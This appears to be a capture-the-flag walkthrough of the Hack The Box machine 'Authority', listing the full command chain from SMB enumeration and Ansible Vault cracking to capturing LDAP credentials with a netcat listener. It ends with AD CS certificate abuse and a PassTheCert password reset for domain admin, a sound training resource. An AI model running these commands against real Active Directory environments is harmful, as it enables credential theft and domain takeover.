# HTB: Authority Walkthrough

[![Hack The Box](https://img.shields.io/badge/HackTheBox-Authority-orange?logo=hackthebox)](https://app.hackthebox.com/machines/553)
[![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Medium-orange)](https://github.com/subhash00/HTB_Labs/)
[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-blue)](https://github.com/subhash00/HTB_Labs/)
[![Topic: Active Directory](https://img.shields.io/badge/Topic-Active%20Directory-yellowgreen)](https://en.wikipedia.org/wiki/Active_Directory)

---

## Overview

**Authority** is a medium-difficulty Windows Active Directory machine on Hack The Box. This challenge tests skills such as SMB enumeration, cracking Ansible Vaults, credential reuse, abusing AD CS misconfigurations, Pass-the-Cert attacks, and privilege escalation using machine account abuse and certificate exploitation.

---

## Table of Contents

- [Enumeration](#enumeration)
- [Initial Shell and Foothold](#initial-shell-and-foothold)
- [Cracking & Ansible Vault Decryption](#cracking--ansible-vault-decryption)
- [Lateral Movement & LDAP Extraction](#lateral-movement--ldap-extraction)
- [Privilege Escalation via AD CS](#privilege-escalation-via-ad-cs)
- [Abusing Certificates & Final Domain Admin Access](#abusing-certificates--final-domain-admin-access)
- [Stepwise PoC](#stepwise-poc)
- [Tools Used](#tools-used)
- [Technology Stack](#technology-stack)

---

## Enumeration

```
ports=$(nmap -p- --min-rate=1000 -T4 10.129.229.56 | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.229.56
```
- Browse discovered web interfaces
    ```
    http://10.129.229.56:80
    https://10.129.229.56:8443/
    ```

- SMB Enumeration:
    ```
    smbclient --no-pass -L //10.129.229.56
    smbclient //10.129.229.56/Development -N
    smb: > ls
    smb: > lcd /home/sabby
    recurse
    prompt OFF
    mget *
    ```

---

## Initial Shell and Foothold

- Clean up and process Ansible Vault files:
    ```
    sed -i 's/^[ \t]*//' vault1
    python3 /usr/share/john/ansible2john.py vault1
    ```

- Crack Ansible Vault credentials:
    ```
    hashcat -m 16900 vault_hashes /usr/share/wordlists/rockyou.txt
    ```

- Decrypt Ansible Vaults:
    ```
    cat vault1 | ansible-vault decrypt
    # Use cracked passwords: svc_pwm, pWm_@dm!N_!23, DevT3st@123
    ```

- Login to PWM web panel (manually via browser) using discovered credentials.

---

## Cracking & Ansible Vault Decryption

- Listen for LDAP connections:
    ```
    nc -lvnp 389
    ```

- Trick server with "Test LDAP Profile" to extract credentials.

- Now connect to host as found user:
    ```
    evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
    ```

---

## Lateral Movement & LDAP Extraction

- Certificate Template Enumeration:
    ```
    certipy find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.126.53 -vulnerable
    cat 20250905104131_Certipy.txt
    ```

- Check MachineAccountQuota:
    ```
    crackmapexec ldap 10.129.126.53 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq
    ```

- Host file update:
    ```
    echo 10.129.126.53 authority.authority.htb authority.htb | sudo tee -a /etc/hosts
    ```

---

## Privilege Escalation via AD CS

- Add machine account:
    ```
    impacket-addcomputer 'authority.htb/svc_ldap' -method LDAPS -computer-name 'TEST01' -computer-pass 'test12345' -dc-ip 10.129.126.53
    ```

- Request admin certificate:
    ```
    certipy req -u TEST01$ -p test12345 -ca AUTHORITY-CA -dc-ip 10.129.126.53 -template 'CorpVPN' -upn 'Administrator' -debug
    ```

- Handle clock skew error (if necessary):
    ```
    sudo ntpdate 10.129.126.53
    ```

---

## Abusing Certificates & Final Domain Admin Access

- Extract certificate and key:
    ```
    certipy cert -pfx administrator.pfx -nokey -out user.crt
    certipy cert -pfx administrator.pfx -nocert -out user.key
    ```

- Use PassTheCert to reset Administrator’s password:
    ```
    python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain authority.htb -dc-ip 10.129.126.53 -target administrator -new-pass
    # Set new password: 5hGyWKrlgGloGkcS6PFZELzUk0B6yaN8
    ```

- Obtain DA shell:
    ```
    evil-winrm -i 10.129.126.53 -u administrator -p 5hGyWKrlgGloGkcS6PFZELzUk0B6yaN8
    ```

---

## Stepwise PoC

<details>
<summary>💻<strong>(click to expand)</strong> </summary>
  <img width="1564" height="838" alt="36" src="https://github.com/user-attachments/assets/9995b1e0-8cdd-46fb-a64f-f8b3d4c3b99f" />
<img width="1557" height="876" alt="35" src="https://github.com/user-attachments/assets/bfeac816-d5e7-45b8-9caa-fd354e5a7d4d" />
<img width="1137" height="691" alt="34" src="https://github.com/user-attachments/assets/3891dc0e-eeba-491a-9b42-d531c175d371" />
<img width="1160" height="627" alt="33" src="https://github.com/user-attachments/assets/3a4a2b01-236b-4d7a-a2db-6051e6a782d6" />
<img width="964" height="681" alt="32" src="https://github.com/user-attachments/assets/56328ef3-b938-430c-bb4e-71baea50f1cf" />
<img width="1731" height="809" alt="31" src="https://github.com/user-attachments/assets/ed86ce74-ec8f-4249-a4e9-cac666f25173" />
<img width="1069" height="444" alt="30" src="https://github.com/user-attachments/assets/b41db335-a5e7-4087-b03a-044b081ba454" />
<img width="1890" height="797" alt="29" src="https://github.com/user-attachments/assets/d278f9bc-0e54-4efc-98fb-7ebbd73e7c89" />
<img width="958" height="410" alt="28" src="https://github.com/user-attachments/assets/7de0f54b-68de-41a1-86e9-4c8ac95dede7" />
<img width="1187" height="834" alt="27" src="https://github.com/user-attachments/assets/029db636-5445-48d9-b6c7-58025d4fa3e8" />
<img width="1102" height="730" alt="26" src="https://github.com/user-attachments/assets/5c8ea367-4fcc-4444-87f5-c5e6ae5d760c" />
<img width="1108" height="460" alt="25" src="https://github.com/user-attachments/assets/d05ed362-689a-4630-8eef-b01b378dc4c9" />
<img width="1082" height="302" alt="24" src="https://github.com/user-attachments/assets/e8da14a2-cb2c-4c27-a59f-8b67541bbcd7" />
<img width="1884" height="104" alt="23" src="https://github.com/user-attachments/assets/977e3d75-9cc3-4aea-9a70-f830fa9d3f07" />
<img width="1774" height="476" alt="22" src="https://github.com/user-attachments/assets/32a82ea0-b7ac-4607-bffd-94e02d38ace4" />
<img width="1894" height="672" alt="21" src="https://github.com/user-attachments/assets/33c8bb00-5ddb-44cb-b9e3-a2b365da13b6" />
<img width="1255" height="431" alt="20" src="https://github.com/user-attachments/assets/e78d1123-0ded-434a-be79-7a482acb5635" />
<img width="1862" height="800" alt="19" src="https://github.com/user-attachments/assets/fa2c0f33-b457-4baa-a738-1c9233648a4a" />
<img width="1908" height="877" alt="18" src="https://github.com/user-attachments/assets/b7725ef9-1f3b-42d4-b97d-2edcdfa7ecff" />
<img width="1148" height="772" alt="17" src="https://github.com/user-attachments/assets/79c0dce7-3624-4258-8eba-b84e47fa6756" />
<img width="1664" height="785" alt="16" src="https://github.com/user-attachments/assets/6e93b4cb-3ccb-4119-8ef8-19cc70bf5db4" />
<img width="776" height="131" alt="15" src="https://github.com/user-attachments/assets/7caed1f4-ae3a-4fe3-9834-211f0021bbeb" />
<img width="1587" height="742" alt="14" src="https://github.com/user-attachments/assets/9b0ff1a6-afe1-4384-ad0c-bc8ee7dbfc3d" />
<img width="977" height="239" alt="13" src="https://github.com/user-attachments/assets/6334617f-443e-47da-a05f-f1a38b6d52ad" />
<img width="979" height="465" alt="12" src="https://github.com/user-attachments/assets/79fbcde6-e439-44c6-8213-bb2f727e097a" />
<img width="973" height="624" alt="11" src="https://github.com/user-attachments/assets/f50c20dd-466a-45fb-a8a7-93ca495327a6" />
<img width="859" height="338" alt="10" src="https://github.com/user-attachments/assets/880d3d6e-9740-403e-8b01-b4c393cdb0e0" />
<img width="962" height="337" alt="9" src="https://github.com/user-attachments/assets/3a8f4d40-77ac-4c5d-93cc-7519fc56e6df" />
<img width="973" height="129" alt="8" src="https://github.com/user-attachments/assets/4b46ec72-168b-41d8-a16c-4e6e0d1497d0" />
<img width="967" height="272" alt="7" src="https://github.com/user-attachments/assets/dd43063c-b346-4ccc-a7f7-b8a19968a6d1" />
<img width="1893" height="743" alt="6" src="https://github.com/user-attachments/assets/77ab6197-ce42-4078-8a25-63eef99378b2" />
<img width="1045" height="124" alt="5" src="https://github.com/user-attachments/assets/99b88ae0-0b30-4eae-a007-17369fad9b1a" />
<img width="1587" height="394" alt="4" src="https://github.com/user-attachments/assets/39894ca9-4064-4d9c-8a1e-42749557b4c8" />
<img width="823" height="317" alt="3" src="https://github.com/user-attachments/assets/e3799c71-a4ca-4e03-9965-5ec0229d7c8d" />
<img width="962" height="276" alt="2" src="https://github.com/user-attachments/assets/efad39dd-0da6-4b2c-bfea-10dc43eb9083" />
<img width="975" height="456" alt="1" src="https://github.com/user-attachments/assets/752a60e2-ee9b-41e9-becd-cfbca81f1edc" />

</details>

---

## Tools Used

| Tool                | Brief Description |
|---------------------|------------------|
| **nmap**            | Powerful network scanner for port and service enumeration. |
| **smbclient**       | Samba client allowing interaction with SMB/CIFS shares from the command line. |
| **sed, cut, grep, tr** | Standard Linux utilities used for efficient text processing and manipulation. |
| **hashcat**         | Advanced password recovery/cracking tool supporting numerous hash types and GPU acceleration. |
| **John the Ripper (with ansible2john)** | Popular password cracker, `ansible2john` script converts Ansible Vault hashes to crackable format. |
| **ansible-vault**   | Tool to encrypt/decrypt sensitive content (like passwords) in Ansible YAML files. |
| **netcat (nc)**     | Swiss army knife for networking, used here to capture cleartext credentials during attacks. |
| **Evil-WinRM**      | Ruby tool to obtain remote shells on Windows machines via WinRM and perform interactive attacks. |
| **Certipy**         | Python tool for enumerating and abusing Active Directory Certificate Services (AD CS) vulnerabilities. |
| **CrackMapExec**    | Post-exploitation and enumeration tool for Active Directory environments; checks common LDAP/SMB/WinRM tasks. |
| **Impacket (addcomputer)** | Library and set of tools for manipulating network protocols, e.g., adding machine accounts. |
| **PassTheCert**     | Exploits AD CS Schannel relay vulnerabilities and performs certificate-based attacks including resetting administrator passwords. |

---

## Technology Stack

| Technology                                | Brief Explanation |
|--------------------------------------------|-------------------|
| **Windows Server / Active Directory**      | Microsoft’s platform for centralized authentication, directory, and policy management across networks. |
| **IIS Web Server**                        | Microsoft's web server for hosting HTTP/HTTPS services and web applications. |
| **LDAP, Kerberos, SMB**                   | Core Windows domain protocols for authentication and file sharing. |
| **AD CS (Active Directory Certificate Services)** | Microsoft’s PKI implementation for issuing certificates within the domain, often vulnerable to privilege escalation. |
| **Ansible Vault (AES-256)**               | Ansible’s encryption system for protecting secrets within configuration files, using AES-256 encryption. |
| **PWM**                                   | Open-source web-based self-service password management solution, often integrated with AD/LDAP. |
| **Python, Bash, Linux Pentesting Utilities** | Used for scripting, automation, and various enumeration/exploitation tools during the attack chain. |

---


